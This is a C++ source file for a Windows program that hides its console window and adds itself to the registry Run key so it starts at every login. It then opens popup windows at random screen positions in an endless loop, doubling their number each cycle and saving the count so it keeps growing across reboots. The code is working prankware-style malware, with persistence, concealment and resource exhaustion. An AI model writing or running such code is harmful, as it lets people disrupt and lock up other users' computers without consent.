#include <windows.h>
#include <iostream>
#include <random>
#include <UST.h>

int getMessageCount() {
    HKEY hKey;
    int count = 1;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\MyApp", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD buffer;
        DWORD bufferSize = sizeof(buffer);

        if (RegQueryValueExA(hKey, "MessageCount", NULL, NULL, (LPBYTE)&buffer, &bufferSize) == ERROR_SUCCESS) {
            count = buffer;
        }
        RegCloseKey(hKey);
    }
    return count;
}

void saveMessageCount(int count) {
    HKEY hKey;

    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\MyApp", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MessageCount", 0, REG_DWORD, (const BYTE*)&count, sizeof(count));
        RegCloseKey(hKey);
    }
}

void showMessageBox(int count) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distribX(0, screenWidth - 300);
    std::uniform_int_distribution<> distribY(0, screenHeight - 150);

    for (int i = 0; i < count; ++i) {
        int x = distribX(gen);
        int y = distribY(gen);

        HWND hwnd = CreateWindowExA(0, "STATIC", "The program is working without problems. You can exit it from the Task Manager.",
            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            x, y, 300, 150, NULL, NULL, NULL, NULL);

        SetWindowTextA(hwnd, "Alert");
        Sleep(1000);
    }
}

void addToStartup() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MyApp", 0, REG_SZ, (const BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

void detachFromConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    FreeConsole();
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    detachFromConsole();

    int count = getMessageCount();
    addToStartup();

    while (true) {
        showMessageBox(count);
        count *= 2;
        saveMessageCount(count);
        Sleep(5000);
    }

    return 0;
}
